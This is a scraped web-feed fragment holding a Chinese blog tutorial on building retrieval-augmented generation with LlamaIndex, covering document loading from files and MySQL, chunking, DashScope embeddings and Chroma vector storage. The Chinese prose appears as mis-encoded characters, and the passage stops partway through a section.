<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºAgentsæ¡†æ¶ï½œLlamaIndexä½¿ç”¨å®æˆ˜ä¹‹RAG]]></title>    <link>https://juejin.cn/post/7576129509934694419</link>    <guid>https://juejin.cn/post/7576129509934694419</guid>    <pubDate>2025-11-24T13:13:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576129509934694419" data-draft-id="7576273949178200127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºAgentsæ¡†æ¶ï½œLlamaIndexä½¿ç”¨å®æˆ˜ä¹‹RAG"/> <meta itemprop="keywords" content="Agent,LLM,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-24T13:13:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºAgentsæ¡†æ¶ï½œLlamaIndexä½¿ç”¨å®æˆ˜ä¹‹RAG
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:13:47.000Z" title="Mon Nov 24 2025 13:13:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<h2 data-id="heading-0"><strong>01 å‰è¨€</strong></h2>
<p>RAGï¼ˆRetrieval Augmented Generationï¼šæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰æ˜¯LlamaIndexçš„æ ¸å¿ƒåŠŸèƒ½æ¨¡å—ï¼Œè¦†ç›–äº†ä»<strong>æ•°æ®åŠ è½½</strong>ã€<strong>ç´¢å¼•æ„å»º</strong>åˆ°<strong>å­˜å‚¨ç®¡ç†åŠæ£€ç´¢</strong>çš„å…¨æµç¨‹ã€‚å…¶æ•°æ®è¿æ¥ä¸åŠ è½½èƒ½åŠ›ï¼Œæ›´æ˜¯LlamaIndexæ—©æœŸå¼€æºé˜¶æ®µçš„ä¸€å¤§äº®ç‚¹ã€‚é€šè¿‡è¿æ¥å’Œæ£€ç´¢ç‰¹å®šæ•°æ®ç‰‡æ®µï¼ŒRAGä¸ä»…æœ‰æ•ˆè§£å†³äº†å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰é¢ä¸´çš„ä¸Šä¸‹æ–‡é•¿åº¦é™åˆ¶ï¼Œä¹Ÿä¿éšœäº†ç§æœ‰é¢†åŸŸæ•°æ®çš„å®‰å…¨ã€‚</p>
<h2 data-id="heading-1"><strong>02 RAGä»‹ç»</strong></h2>
<p><strong>RAGï¼ˆRetrieval Augmented Generationï¼šæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰</strong> æ˜¯ä¸€ç§å¢å¼ºå¤§æ¨¡å‹ä¸Šä¸‹æ–‡æ¥æé«˜å¤§æ¨¡å‹å›ç­”å‡†ç¡®æ€§çš„æœ‰æ•ˆä¸”é‡è¦æ‰‹æ®µã€‚é€šè¿‡æ£€ç´¢ç‰¹å®šå†…å®¹ä¹Ÿä¿éšœäº†ä¼ä¸šæ•°æ®çš„å®‰å…¨ã€‚</p>
<p>å…¶æµç¨‹å¦‚ä¸‹(å›¾æ¥è‡ªå®˜æ–¹)ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ae194124bdd419f82dc6d9115a5ae94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594827&amp;x-signature=YA7X78CwFzk81tpdkEvBJkriiPY%3D" alt="" loading="lazy"/></p>
<p>æ ¸å¿ƒæ­¥éª¤åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>Loadingï¼š</strong></p>
<p>æ•°æ®åŠ è½½ï¼Œé€šè¿‡åŠ è½½ä¸åŒçš„æ•°æ®æºè¿›è¡Œæ•°æ®è·å–ï¼Œå¦‚æ•°æ®åº“ã€PDFã€APIæ¥å£ç­‰ç­‰æ–¹å¼ï¼ŒLlamaIndexç›®å‰æ”¯æŒä¸Šç™¾ç§æ•°æ®æºçš„è¿æ¥ã€‚</p>
</li>
<li>
<p><strong>Indexingï¼š</strong></p>
<p>ç´¢å¼•æ„å»ºï¼ŒåŒ…æ‹¬å¯¹åŠ è½½æ•°æ®åˆ†å—ã€å‘é‡åŒ–ä»¥åŠå…ƒæ•°æ®æå–ï¼Œå‘é‡åŒ–é€šå¸¸è¢«ç”¨äºè¯­ä¹‰åŒ¹é…ã€‚</p>
</li>
<li>
<p><strong>Storingï¼š</strong></p>
<p>å­˜å‚¨ï¼Œå¯¹æ„å»ºçš„å‘é‡æ•°æ®å’Œå…ƒæ•°æ®è¿›è¡Œå­˜å‚¨ï¼Œé¿å…å¯¹æºæ•°æ®è¿›è¡Œå¤šæ¬¡å‘é‡åŒ–æ“ä½œã€‚</p>
</li>
<li>
<p><strong>Queryingï¼š</strong></p>
<p>æ£€ç´¢ï¼Œæ ¹æ®ç”¨æˆ·é—®é¢˜å¯¹æ•°æ®è¿›è¡Œæ£€ç´¢å¬å›ï¼Œå¹¶åŠ å…¥åˆ°å¤§æ¨¡å‹çš„ä¸Šä¸‹æ–‡ä¸­ã€‚å¸¸è§æ£€ç´¢çš„æ–¹å¼åŒ…æ‹¬å‘é‡åŒ–è¯­ä¹‰æ£€ç´¢åŒæ—¶ä¼´æœ‰å…ƒæ•°æ®è¿‡æ»¤ã€å…¨æ–‡å…³é”®è¯æ£€ç´¢ã€æ··åˆæ£€ç´¢å¹¶åº”ç”¨é‡æ’åºç­‰ã€‚</p>
</li>
<li>
<p><strong>Evaluatingï¼š</strong> è¯„ä¼°æ•ˆæœï¼ŒRAGçš„æ•ˆæœè¯„ä¼°æ˜¯å¯¹ç»“æœçš„æ£€éªŒï¼Œä¹Ÿæ˜¯è¿›è¡Œä¼˜åŒ–ç´¢å¼•å’Œæ£€ç´¢çš„ä¾æ®ã€‚</p>
</li>
</ul>
<h2 data-id="heading-2"><strong>03 LlamaIndexçš„RAGå®æˆ˜</strong></h2>
<p><strong>æ•°æ®åŠ è½½</strong></p>
<p>LlamaIndexæä¾›äº†ä¸Šç™¾ç§è¿æ¥æ•°æ®çš„æ–¹å¼ï¼ŒåŒ…æ‹¬ï¼š<strong>æœ¬åœ°æ–‡ä»¶åŠ è½½</strong>ã€<strong>é›†æˆè¿æ¥å™¨</strong>ï¼ˆå¯ä»¥é€šè¿‡llamahubæœç´¢ï¼‰ã€<strong>é€šè¿‡æ–‡æœ¬åˆ›å»ºDocument</strong>ã€‚åŠ è½½åçš„æ•°æ®éƒ½ç»Ÿä¸€è½¬æ¢æˆDocumentç±»å¯¹è±¡ã€‚</p>
<p><strong>1ã€æœ¬åœ°æ–‡ä»¶åŠ è½½</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> SimpleDirectoryReader
documents = SimpleDirectoryReader(<span class="hljs-string">"../data"</span>).load_data()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"document length:<span class="hljs-subst">{<span class="hljs-built_in">len</span>(documents)}</span>, document:<span class="hljs-subst">{documents}</span>"</span>)
</code></pre>
<p>LlamaIndexä¸­å®šä¹‰äº†SimpleDirectoryReaderç±»ï¼Œæ˜¯å†…ç½®çš„æœ€ç®€å•çš„æ–¹å¼ï¼Œå¯¹æœ¬åœ°æ–‡ä»¶è¿›è¡ŒåŠ è½½ã€‚ç¤ºä¾‹ä¸­ä¼šåŠ è½½å½“å‰ç›®å½•çš„ä¸Šçº§dataç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚</p>
<p><strong>2ã€é›†æˆè¿æ¥å™¨</strong></p>
<p>ä»¥DBä¸ºä¾‹ï¼Œé€šè¿‡è¿æ¥DBï¼Œæ‰§è¡ŒSqlæŸ¥è¯¢çš„æ¯ä¸€æ¡æ•°æ®éƒ½æ˜¯ä¸€ä¸ªDocumentã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># pip3 install llama-index-readers-database</span>
from llama_index.readers.database import DatabaseReader
<span class="hljs-comment"># ä½¿ç”¨PyMySQLï¼špip3 install pymysql</span>
<span class="hljs-comment"># {root}æ¢æˆå¯†ç </span>
<span class="hljs-attr">reader_media</span> = DatabaseReader(
<span class="hljs-attr">uri</span>=<span class="hljs-string">"mysql+pymysql://root:{root}@localhost:3306/demo"</span>,
<span class="hljs-attr">schema</span>=<span class="hljs-string">"demo"</span>,  <span class="hljs-comment"># optional namespace</span>
)
<span class="hljs-comment"># åŠ è½½</span>
<span class="hljs-attr">docs</span> = reader_media.load_data(
<span class="hljs-attr">query</span>=<span class="hljs-string">"SELECT id,username,age,sex,register_time,address FROM xudj.user;"</span>,
<span class="hljs-comment"># å…ƒæ•°æ®åˆ—</span>
<span class="hljs-attr">metadata_cols</span>=[
(<span class="hljs-string">"id"</span>, <span class="hljs-string">"user_id"</span>), <span class="hljs-comment"># å‚æ•°è½¬æ¢ï¼Œç”¨user_idæ›¿ä»£idå­˜å‚¨</span>
<span class="hljs-string">"username"</span>,
],  <span class="hljs-comment"># map / include in metadata</span>
<span class="hljs-attr">excluded_text_cols</span>=[<span class="hljs-string">"address"</span>],  <span class="hljs-comment"># å‰”é™¤å­—æ®µ</span>
<span class="hljs-attr">document_id</span>=lambda row: f<span class="hljs-string">"xudj-user-{row['id']}"</span>,  <span class="hljs-comment"># custom document id</span>
)
print(docs)
</code></pre>
<p>ç¤ºä¾‹é¦–å…ˆå¯¼å…¥æ•°æ®åº“ç›¸å…³ä¾èµ–ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯Mysqlï¼Œå¯ä»¥é€šè¿‡llamahub.ai/?tab=readersæœç´¢ä½¿ç”¨æ–¹å¼ï¼Œç„¶åå®šä¹‰DatabaseReaderé…ç½®è¿æ¥ä¿¡æ¯ï¼Œå†è°ƒç”¨load_dataæ‰§è¡Œsqlå®Œæˆæ•°æ®åŠ è½½ã€‚</p>
<p><strong>3ã€é€šè¿‡æ–‡æœ¬åˆ›å»ºDocument</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> Document
doc = Document(doc_id=<span class="hljs-string">"1"</span>, text=<span class="hljs-string">"æ–‡æœ¬åˆ›å»º"</span>, metadata={<span class="hljs-string">"id"</span>:<span class="hljs-string">"1"</span>, <span class="hljs-string">"type"</span>:<span class="hljs-string">"custom"</span>})
<span class="hljs-built_in">print</span>(doc)
<span class="hljs-built_in">print</span>(doc.metadata)
</code></pre>
<p>æœ‰äº†æ–‡æœ¬ï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„æ–¹å¼ã€‚</p>
<p><strong>ç´¢å¼•æ„å»º</strong></p>
<p>æ•°æ®åŠ è½½åï¼Œæœ‰äº†ä¸€ç³»åˆ—çš„Documentï¼Œä¾¿å¯ä»¥è¿›è¡Œ<strong>ç´¢å¼•çš„æ„å»º</strong>ã€‚åŒ…æ‹¬é•¿æ–‡æœ¬æŒ‰ç‰¹å®šè§„åˆ™åˆ†å—ã€æå–å…ƒæ•°æ®ã€å‘é‡åŒ–å¤„ç†ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">from llama_index.core.node_parser import TokenTextSplitter
from llama_index.core import VectorStoreIndex
from llama_index.core import Settings
from llama_index.embeddings.dashscope import DashScopeEmbedding
from llama_index.core import StorageContext
<span class="hljs-comment"># pip install chromadb</span>
<span class="hljs-comment"># pip install llama-index-vector-stores-chroma</span>
import chromadb
from llama_index.vector_stores.chroma import ChromaVectorStore
<span class="hljs-comment"># 1ã€åˆ†å— - chunk_sizeæ¯å—çš„tokenæ•°</span>
<span class="hljs-attr">text_splitter</span> = TokenTextSplitter(chunk_size=<span class="hljs-number">200</span>, chunk_overlap=<span class="hljs-number">5</span>)
<span class="hljs-comment"># 2ã€å‘é‡åŒ–æ¨¡å‹ï¼Œä½¿ç”¨åƒé—®çš„æ¨¡å‹</span>
<span class="hljs-attr">dashscope_embed_model</span> = DashScopeEmbedding(
<span class="hljs-attr">model_name</span>=<span class="hljs-string">"text-embedding-v2"</span>,
<span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-..."</span>)
<span class="hljs-comment"># å‘é‡åŒ–å­˜å‚¨ï¼Œé»˜è®¤ä½¿ç”¨åŸºäºå†…å­˜çš„SimpleVectorStoreç±»</span>
<span class="hljs-comment"># åˆå§‹åŒ–å®¢æˆ·ç«¯ï¼Œè®¾ç½®ä¿å­˜æ•°æ®çš„è·¯å¾„</span>
<span class="hljs-attr">db</span> = chromadb.PersistentClient(path=<span class="hljs-string">"./chroma_db"</span>)
<span class="hljs-comment"># 3ã€åˆ›å»ºå‘é‡å­˜å‚¨ä¸Šä¸‹æ–‡</span>
<span class="hljs-attr">chroma_collection</span> = db.get_or_create_collection(<span class="hljs-string">"quickstart"</span>)
<span class="hljs-attr">vector_store</span> = ChromaVectorStore(chroma_collection=chroma_collection)
<span class="hljs-attr">storage_context</span> = StorageContext.from_defaults(vector_store=vector_store)
<span class="hljs-comment"># 4ã€åˆ›å»ºindex</span>
<span class="hljs-attr">index</span> = VectorStoreIndex.from_documents(
<span class="hljs-attr">documents</span>=documents,
<span class="hljs-attr">transformations</span>=[text_splitter],
<span class="hljs-attr">embed_model</span>=dashscope_embed_model,
<span class="hljs-attr">insert_batch_size</span>=<span class="hljs-number">5</span>,  <span class="hljs-comment"># é™åˆ¶æ¯æ¬¡æ’å…¥çš„èŠ‚ç‚¹æ•°é‡</span>
<span class="hljs-attr">storage_context</span>=storage_context,
)
</code></pre>
<p>ç¤ºä¾‹åŒ…æ‹¬4éƒ¨åˆ†ï¼ˆä¸‹é¢åºå·å¯¹åº”ä»£ç æ³¨é‡Šåºå·ï¼‰ï¼š</p>
<p>1ã€é¦–å…ˆå®šä¹‰äº†<strong>åˆ†å—é€»è¾‘</strong>ï¼Œç¤ºä¾‹ä½¿ç”¨Tokenè®¡æ•°çš„åˆ†å—æ–¹å¼ï¼Œé»˜è®¤æ˜¯æŒ‰å®Œæ•´å¥å­æ‹†åˆ†çš„SentenceSplitterç±»ï¼Œå®ƒä»¬éƒ½å±äºNodeParserçš„å­ç±»ï¼Œç”¨äºå°†Documentæ‹†åˆ†æˆNodeï¼ˆNodeè¡¨ç¤ºDocumentçš„ä¸€ä¸ªåˆ†å—â€œchunkâ€ï¼Œå¯ä»¥æ˜¯æ–‡æœ¬æˆ–å›¾ç‰‡ç­‰ï¼‰ï¼›åœ¨LlamaIndexä¸­ï¼Œä¸ç®¡æ˜¯åˆ†å—XxxSplitterç±»ã€æå–å…ƒæ•°æ®XxxExtractorç±»ï¼ˆç¤ºä¾‹æœªä½“ç°ï¼‰ã€å‘é‡åŒ–Nodeæ•°æ®XxxEmbeddingç±»ï¼Œå®ƒä»¬éƒ½å±äºtransformationsï¼Œåœ¨è§£æDocumentæ—¶ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªï¼Œtransformationsæ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚</p>
<p>2ã€å®šä¹‰<strong>å‘é‡åŒ–æ¨¡å‹</strong>ä¸ºåƒé—®çš„text-embedding-v2ï¼ŒLlamaIndexé»˜è®¤ä½¿ç”¨çš„OpenAIçš„text-embedding-ada-002æ¨¡å‹ï¼Œè¿™å’Œæ¡†æ¶çš„èµ·æºæœ‰å…³ï¼Œä¸€å¼€å§‹å°±æ˜¯ä¸ºäº†è§£å†³OpenAIç³»åˆ—æ¨¡å‹ç›¸å…³é—®é¢˜ã€‚</p>
<p>3ã€åˆ›å»º<strong>å‘é‡åŒ–å­˜å‚¨åº“</strong>ï¼Œç¤ºä¾‹ä½¿ç”¨çš„æ˜¯å¼€æºå‘é‡åº“chromaï¼ŒæŒ‡å®šå­˜å‚¨ç›®å½•å’Œé›†åˆåã€‚</p>
<p>4ã€å®šä¹‰<strong>Indexï¼ˆç”±Documentç»„æˆçš„æ•°æ®ç»“æ„ï¼‰</strong> ï¼Œå¹¶æŒ‡å®šæ–‡æ¡£Documentsã€è½¬æ¢åˆ—è¡¨transformationsã€å‘é‡åŒ–æ¨¡å‹åŠæ¯æ‰¹æ¬¡æ•°é‡ã€å‘é‡åŒ–å­˜å‚¨åº“ã€‚VectorStoreIndexæ˜¯LlamaIndexä¸­æœ€å¸¸è§çš„ç´¢å¼•ç±»å‹ï¼Œé€šè¿‡å°†Documentæ‹†åˆ†æˆNodeï¼Œç„¶åè¿›è¡Œå‘é‡åŒ–æ¯ä¸ªNodeï¼Œä¸ºåç»­è¯­ä¹‰æ£€ç´¢åšå‡†å¤‡ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ä¸­å®šä¹‰çš„æ‰€æœ‰ç»„ä»¶ï¼Œåœ¨LlamaIndexä¸­éƒ½æœ‰é»˜è®¤çš„å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡SettingsæŸ¥è¯¢ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡Settingsè¿›è¡Œè®¾ç½®é»˜è®¤å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> llama_index.core <span class="hljs-keyword">import</span> Settings
<span class="hljs-keyword">import</span> os
<span class="hljs-comment"># éšä¾¿è®¾ç½®å€¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™æ‰¾ä¸åˆ°apiKey</span>
os.environ[<span class="hljs-string">"OPENAI_API_KEY"</span>] = <span class="hljs-string">"sk-..."</span>
<span class="hljs-comment"># é»˜è®¤ä½¿ç”¨OpenAIçš„text-embedding-ada-002æ¨¡å‹</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.embed_model :<span class="hljs-subst">{Settings.embed_model}</span>"</span>)
<span class="hljs-comment"># é»˜è®¤ä½¿ç”¨çš„SentenceSplitterï¼Œè¿™ä¸‰ä¸ªå–å¾—éƒ½æ˜¯ç›¸åŒçš„é»˜è®¤node_parser</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.transformations :<span class="hljs-subst">{Settings.transformations}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.text_splitter :<span class="hljs-subst">{Settings.text_splitter}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Settings.node_parser :<span class="hljs-subst">{Settings.node_parser}</span>"</span>)
<span class="hljs-comment"># globalå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼è®¾ç½®</span>
<span class="hljs-comment"># Settings.text_splitter = text_splitter</span>
</code></pre>
<p>ä¸Šé¢æˆ‘ä»¬å·²ç»æŠŠæ•°æ®è¿›è¡Œäº†å‘é‡åŒ–å­˜å‚¨ï¼Œå¦‚æœæƒ³è¦åŸºäºå­˜å‚¨çš„å‘é‡æ•°æ®æ„å»ºIndexç´¢å¼•ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼Œä¸ç”¨å†æ¬¡ç»è¿‡ä¸€éä¸Šé¢çš„æµç¨‹å¤„ç†æ•°æ®äº†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä»å‘é‡åº“ä¸­åˆ›å»ºindexï¼ŒæŒ‡å®šå‘é‡åº“å’Œæ¨¡å‹</span>
<span class="hljs-attr">index</span> = VectorStoreIndex.from_vector_store(
<span class="hljs-attr">vector_store</span>=vector_store,
<span class="hljs-attr">embed_model</span>=dashscope_embed_model,
)
</code></pre>
<p>1ã€æœ‰å…³Documentå’ŒNodeä»‹ç»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.llamaindex.ai%2Fpython%2Fframework%2Fmodule" target="_blank" title="https://developers.llamaindex.ai/python/framework/module" ref="nofollow noopener noreferrer">developers.llamaindex.ai/python/framâ€¦</a>_guides/loading/documents_and_nodes/</p>
<p>ç±»å®šä¹‰è§ï¼šllama_index.core.schema</p>
<p>2ã€chromaå¼€æºå‘é‡åº“ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchroma-core%2Fchroma" target="_blank" title="https://github.com/chroma-core/chroma" ref="nofollow noopener noreferrer">github.com/chroma-coreâ€¦</a></p>
<p>3ã€Indexä¸åŒçš„ç´¢å¼•ç±»å‹å’Œæ£€ç´¢ä»‹ç»ï¼š</p>
